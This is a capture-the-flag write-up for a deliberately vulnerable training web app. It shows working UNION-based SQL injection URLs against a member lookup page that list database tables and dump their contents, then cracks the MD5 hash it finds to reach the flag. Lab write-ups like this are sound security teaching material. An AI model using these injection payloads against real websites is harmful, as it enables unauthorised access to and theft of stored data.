For this flag, i used an sql injection from the member get by id route.

Here is the route, normaly used :/index.php?page=member&id=2Submit=Submit

With a union sql injection attack I was able to export 5 tables content.

I was able to extract the table names with this request :
http://{{host}}/index.php?page=member&id=2 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables&Submit=Submit

Here is a sample of the union attack, for the db vote_dbs :
http://{{host}}/index.php?page=member&id=2 UNION SELECT nb_vote, subject FROM Member_survey.vote_dbs&Submit=Submit

For this db export, try this URL :
http://192.168.0.18/index.php?page=member&id=2%20UNION%20SELECT%20title,%20comment%20FROM%20Member_images.list_images&Submit=Submit

For this flag, this is the list_images table that will contain the flag. Here is the exported table :

| id | url | title | comment |
| --- | --- | --- | --- |
| 1 | https://fr.wikipedia.org/wiki/Programme_ | Nsa | An image about the NSA ! |
| 2 | https://fr.wikipedia.org/wiki/Fichier:42 | 42 ! | There is a number.. |
| 3 | https://fr.wikipedia.org/wiki/Logo_de_Go | Google | Google it ! |
| 4 | https://en.wikipedia.org/wiki/Earth#/med | Earth | Earth! |
| 5 | borntosec.ddns.net/images.png | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |

`1928e8083cf461a51303633093573c46` decryption is `albatroz` .

`albatroz` sha256 hash is `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188` 

So we got the flag !
